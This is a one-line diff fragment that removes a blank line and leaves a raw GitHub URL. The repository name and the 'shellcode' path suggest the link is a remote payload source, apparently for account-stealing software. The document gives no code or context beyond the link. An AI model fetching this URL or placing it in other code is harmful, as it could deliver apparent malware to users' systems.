@@ -1,2 +1,1 @@
-
 https://github.com/s1uiasdad/log-acc-v2/raw/main/scr/shellcode/Xclient
